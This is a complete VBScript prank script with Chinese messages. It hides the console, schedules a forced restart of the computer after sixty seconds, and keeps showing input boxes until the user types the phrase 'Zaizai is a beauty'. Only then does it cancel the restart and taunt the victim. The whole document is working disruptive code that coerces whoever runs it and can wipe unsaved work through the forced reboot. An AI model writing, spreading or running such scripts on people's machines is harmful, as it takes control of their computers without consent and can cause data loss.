on error resume next 
dim WSHshellA 
set WSHshellA = wscript.createobject("wscript.shell") 
WSHshellA.run "cmd.exe /c shutdown -r -t 60 -c ""说“仔仔是个美女”，不说“仔仔是个美女”就一分钟关你机，不信，试试···"" ",0 ,true 
dim a 
do while(a <> "仔仔是个美女") 
a = inputbox ("说“仔仔是个美女”,就不关机，快撒，说 ""“仔仔是个美女”"" ","说不说？","不说？",8000,7000) 
msgbox chr(13) + chr(13) + chr(13) + a,0,"MsgBox" 
loop 
msgbox chr(13) + chr(13) + chr(13) + "早说就行了嘛" 
dim WSHshell 
set WSHshell = wscript.createobject("wscript.shell") 
WSHshell.run "cmd.exe /c shutdown -a",0 ,true 
msgbox chr(13) + chr(13) + chr(13) + "哈哈哈哈，真过瘾"